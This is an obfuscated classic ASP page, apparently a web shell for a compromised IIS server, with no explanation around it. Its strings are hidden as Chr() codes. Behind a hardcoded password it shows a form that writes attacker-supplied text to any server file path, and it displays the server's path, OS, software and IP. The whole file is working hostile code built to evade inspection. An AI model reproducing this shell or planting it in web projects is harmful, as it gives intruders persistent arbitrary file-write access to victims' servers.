<%
Public O0O0l1l1O0l1O0O0l1O0l1O0
Public O0l1l1O0l1l1l1O0O0l1O0
Public O0O0O0O0l1O0l1l1l1O0l1
Public O0O0l1O0O0l1l1l1O0l1O0l1O0
Public O0l1l1O0l1O0O0O0O0l1l1O0O0
    On Error Resume Next 
    Response.Write vbCrLf 
    If Request ( Chr ( 112 ) & Chr ( 97 ) & Chr ( 115 ) & Chr ( 115 ) ) = Chr ( 52 ) & Chr ( 52 ) & Chr ( 49 ) & Chr ( 54 ) Then 
        Session ( Chr ( 112 ) & Chr ( 119 ) ) = Chr ( 103 ) & Chr ( 111 )  
    End If 
    Response.Write vbCrLf 
    If Session ( Chr ( 112 ) & Chr ( 119 ) ) <> Chr ( 103 ) & Chr ( 111 ) Then 
    Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 99 ) & Chr ( 101 ) & Chr ( 110 ) & Chr ( 116 ) & Chr ( 101 ) & Chr ( 114 ) & Chr ( 62 ) & Chr ( 60 ) & Chr ( 98 ) & Chr ( 114 ) & Chr ( 62 ) & Chr ( 60 ) & Chr ( 102 ) & Chr ( 111 ) & Chr ( 114 ) & Chr ( 109 ) & Chr ( 32 ) & Chr ( 97 ) & Chr ( 99 ) & Chr ( 116 ) & Chr ( 105 ) & Chr ( 111 ) & Chr ( 110 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 39 ) & Chr ( 32 ) & Chr ( 109 ) & Chr ( 101 ) & Chr ( 116 ) & Chr ( 104 ) & Chr ( 111 ) & Chr ( 100 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 112 ) & Chr ( 111 ) & Chr ( 115 ) & Chr ( 116 ) & Chr ( 39 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 105 ) & Chr ( 110 ) & Chr ( 112 ) & Chr ( 117 ) & Chr ( 116 ) & Chr ( 32 ) & Chr ( 110 ) & Chr ( 97 ) & Chr ( 109 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 112 ) & Chr ( 97 ) & Chr ( 115 ) & Chr ( 115 ) & Chr ( 39 ) & Chr ( 32 ) & Chr ( 116 ) & Chr ( 121 ) & Chr ( 112 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 112 ) & Chr ( 97 ) & Chr ( 115 ) & Chr ( 115 ) & Chr ( 119 ) & Chr ( 111 ) & Chr ( 114 ) & Chr ( 100 ) & Chr ( 39 ) & Chr ( 32 ) & Chr ( 115 ) & Chr ( 105 ) & Chr ( 122 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 49 ) & Chr ( 53 ) & Chr ( 39 ) & Chr ( 62 ) & Chr ( 32 ) & Chr ( 60 ) & Chr ( 105 ) & Chr ( 110 ) & Chr ( 112 ) & Chr ( 117 ) & Chr ( 116 ) & Chr ( 32 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 116 ) & Chr ( 121 ) & Chr ( 112 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 115 ) & Chr ( 117 ) & Chr ( 98 ) & Chr ( 109 ) & Chr ( 105 ) & Chr ( 116 ) & Chr ( 39 ) & Chr ( 32 ) & Chr ( 118 ) & Chr ( 97 ) & Chr ( 108 ) & Chr ( 117 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 71 ) & Chr ( 111 ) & Chr ( 39 ) & Chr ( 62 ) & Chr ( 60 ) & Chr ( 47 ) & Chr ( 99 ) & Chr ( 101 ) & Chr ( 110 ) & Chr ( 116 ) & Chr ( 101 ) & Chr ( 114 ) & Chr ( 62 )  
        Response.Write vbCrLf 
    Else 
    Response.Write vbCrLf 
        Set O0O0l1l1O0l1O0O0l1O0l1O0 = Server.CreateObject ( Chr ( 115 ) & Chr ( 99 ) & Chr ( 114 ) & Chr ( 105 ) & Chr ( 112 ) & Chr ( 116 ) & Chr ( 105 ) & Chr ( 110 ) & Chr ( 103 ) & Chr ( 46 ) & Chr ( 102 ) & Chr ( 105 ) & Chr ( 108 ) & Chr ( 101 ) & Chr ( 115 ) & Chr ( 121 ) & Chr ( 115 ) & Chr ( 116 ) & Chr ( 101 ) & Chr ( 109 ) & Chr ( 111 ) & Chr ( 98 ) & Chr ( 106 ) & Chr ( 101 ) & Chr ( 99 ) & Chr ( 116 ) )  
        O0l1l1O0l1l1l1O0O0l1O0 = Request ( Chr ( 112 ) & Chr ( 97 ) & Chr ( 116 ) & Chr ( 104 ) )  
        If O0l1l1O0l1l1l1O0O0l1O0 <>   "" Then 
            O0O0O0O0l1O0l1l1l1O0l1 = Request ( Chr ( 100 ) & Chr ( 97 ) )  
            Set O0O0l1O0O0l1l1l1O0l1O0l1O0 = O0O0l1l1O0l1O0O0l1O0l1O0.createtextfile ( O0l1l1O0l1l1l1O0O0l1O0 , true )  
            O0O0l1O0O0l1l1l1O0l1O0l1O0.Write O0O0O0O0l1O0l1l1l1O0l1 
            If Err = ( 53 * 48 - 2544 ) Then 
                Response.Write vbCrLf 
                Response.Write Chr ( 115 ) & Chr ( 117 ) & Chr ( 99 ) & Chr ( 99 ) & Chr ( 101 ) & Chr ( 115 ) & Chr ( 115 )  
                Response.Write vbCrLf 
            Else 
            Response.Write vbCrLf 
                Response.Write Chr ( 110 ) & Chr ( 111 )  
                Response.Write vbCrLf 
            End If 
            Err.Clear 
        End If 
        O0O0l1O0O0l1l1l1O0l1O0l1O0.Close 
        Response.Write vbCrLf 
        Set O0O0l1O0O0l1l1l1O0l1O0l1O0 = Nothing 
        Response.Write vbCrLf 
        Set O0l1l1O0l1O0O0O0O0l1l1O0O0 = Nothing 
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 102 ) & Chr ( 111 ) & Chr ( 114 ) & Chr ( 109 ) & Chr ( 32 ) & Chr ( 97 ) & Chr ( 99 ) & Chr ( 116 ) & Chr ( 105 ) & Chr ( 111 ) & Chr ( 110 ) & Chr ( 61 ) & Chr ( 39 ) & Chr ( 39 ) & Chr ( 32 ) & Chr ( 109 ) & Chr ( 101 ) & Chr ( 116 ) & Chr ( 104 ) & Chr ( 111 ) & Chr ( 100 ) & Chr ( 61 ) & Chr ( 112 ) & Chr ( 111 ) & Chr ( 115 ) & Chr ( 116 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 105 ) & Chr ( 110 ) & Chr ( 112 ) & Chr ( 117 ) & Chr ( 116 ) & Chr ( 32 ) & Chr ( 116 ) & Chr ( 121 ) & Chr ( 112 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 116 ) & Chr ( 101 ) & Chr ( 120 ) & Chr ( 116 ) & Chr ( 32 ) & Chr ( 110 ) & Chr ( 97 ) & Chr ( 109 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 112 ) & Chr ( 97 ) & Chr ( 116 ) & Chr ( 104 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 98 ) & Chr ( 114 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 77 ) & Chr ( 97 ) & Chr ( 112 ) & Chr ( 112 ) & Chr ( 97 ) & Chr ( 116 ) & Chr ( 104 ) & Chr ( 58 ) & Server.MapPath ( Request.ServerVariables ( Chr ( 115 ) & Chr ( 99 ) & Chr ( 114 ) & Chr ( 105 ) & Chr ( 112 ) & Chr ( 116 ) & Chr ( 95 ) & Chr ( 110 ) & Chr ( 97 ) & Chr ( 109 ) & Chr ( 101 ) ) )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 98 ) & Chr ( 114 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 79 ) & Chr ( 83 ) & Chr ( 58 ) & Request.ServerVariables ( Chr ( 79 ) & Chr ( 83 ) )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 98 ) & Chr ( 114 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 87 ) & Chr ( 69 ) & Chr ( 66 ) & Chr ( 58 ) & Request.ServerVariables ( Chr ( 83 ) & Chr ( 69 ) & Chr ( 82 ) & Chr ( 86 ) & Chr ( 69 ) & Chr ( 82 ) & Chr ( 95 ) & Chr ( 83 ) & Chr ( 79 ) & Chr ( 70 ) & Chr ( 84 ) & Chr ( 87 ) & Chr ( 65 ) & Chr ( 82 ) & Chr ( 69 ) )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 98 ) & Chr ( 114 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 73 ) & Chr ( 80 ) & Chr ( 58 ) & Request.ServerVariables ( Chr ( 76 ) & Chr ( 79 ) & Chr ( 67 ) & Chr ( 65 ) & Chr ( 76 ) & Chr ( 95 ) & Chr ( 65 ) & Chr ( 68 ) & Chr ( 68 ) & Chr ( 82 ) )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 98 ) & Chr ( 114 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write   ""  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 116 ) & Chr ( 101 ) & Chr ( 120 ) & Chr ( 116 ) & Chr ( 97 ) & Chr ( 114 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 32 ) & Chr ( 110 ) & Chr ( 97 ) & Chr ( 109 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 100 ) & Chr ( 97 ) & Chr ( 32 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 108 ) & Chr ( 115 ) & Chr ( 61 ) & Chr ( 53 ) & Chr ( 48 ) & Chr ( 32 ) & Chr ( 114 ) & Chr ( 111 ) & Chr ( 119 ) & Chr ( 115 ) & Chr ( 61 ) & Chr ( 49 ) & Chr ( 48 ) & Chr ( 32 ) & Chr ( 119 ) & Chr ( 105 ) & Chr ( 100 ) & Chr ( 116 ) & Chr ( 104 ) & Chr ( 61 ) & Chr ( 51 ) & Chr ( 48 ) & Chr ( 62 ) & Chr ( 60 ) & Chr ( 47 ) & Chr ( 116 ) & Chr ( 101 ) & Chr ( 120 ) & Chr ( 116 ) & Chr ( 97 ) & Chr ( 114 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 98 ) & Chr ( 114 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 105 ) & Chr ( 110 ) & Chr ( 112 ) & Chr ( 117 ) & Chr ( 116 ) & Chr ( 32 ) & Chr ( 116 ) & Chr ( 121 ) & Chr ( 112 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 115 ) & Chr ( 117 ) & Chr ( 98 ) & Chr ( 109 ) & Chr ( 105 ) & Chr ( 116 ) & Chr ( 32 ) & Chr ( 118 ) & Chr ( 97 ) & Chr ( 108 ) & Chr ( 117 ) & Chr ( 101 ) & Chr ( 61 ) & Chr ( 115 ) & Chr ( 97 ) & Chr ( 118 ) & Chr ( 101 ) & Chr ( 62 )  
        Response.Write vbCrLf 
        Response.Write Chr ( 60 ) & Chr ( 47 ) & Chr ( 102 ) & Chr ( 111 ) & Chr ( 114 ) & Chr ( 109 ) & Chr ( 62 )  
        Response.Write vbCrLf 
    End If 
    Response.Write vbCrLf 

%>
